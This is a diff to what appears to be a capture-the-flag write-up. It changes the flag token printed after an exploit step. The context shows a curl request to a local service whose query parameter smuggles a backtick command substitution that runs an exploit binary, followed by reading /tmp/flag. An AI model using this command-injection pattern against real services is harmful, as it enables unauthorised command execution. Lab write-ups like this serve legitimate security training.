@@ -109,7 +109,7 @@ Now let's execute a command using curl to get our flag :
 $ curl localhost:4646?x='`/*/EXPLOIT`'
 
 $ cat /tmp/flag
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 
 End of simulation
